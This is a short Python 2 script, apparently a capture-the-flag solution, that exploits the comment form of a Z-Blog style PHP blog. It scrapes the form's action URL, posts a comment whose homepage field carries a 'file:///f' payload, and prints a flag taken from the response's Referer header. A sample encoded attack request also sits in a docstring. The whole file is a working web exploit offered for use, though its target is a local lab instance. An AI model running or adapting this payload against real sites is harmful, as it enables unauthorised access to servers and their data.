import requests


def find(target, lines):
    for line in lines:
        if target in line:
            return line
    return None

def exploit(host, port):
    # varibles
    base_url = "http://%s:%d" % (host, port)
    session = requests.Session()
    comment_url = "%s/?id=2" % (base_url) 
    # fetch form action
    comment_page = session.get(comment_url).content
    action_url = find("frmSumbit", comment_page.split("\n")).split('action="')[1].split('" >')[0].replace("&amp;","&")
    if action_url == None:
        return ""
    print action_url
    # Post payload
    '''
    action=http%3A%2F%2F192.168.159.130%2Fzb_system%2Fcmd.php%3Fact%3Dcmt%26postid%3D2%26key%3D5ffd8ce961dfbec161cf63643e3f2760&postid=2&name=lag&email=admin%40admin.com&content=dsa&homepage=file%3A%2F%2Ff&replyid=0&format=json
    '''
    data = {
            "action":action_url,
            "postid":0,
            "name":"lag",
            "email":"admin@admin.com",
            "content":"admin",
            "homepage":"file:///f",
            "replyid":0,
            "format":"json",
    }
    response = session.post(action_url, data=data)
    print response.headers
    print response.content
    return response.headers['Referer']

def main():
    print "FLAG: %s" % exploit("127.0.0.1", 80)

if __name__ == "__main__":
    main()

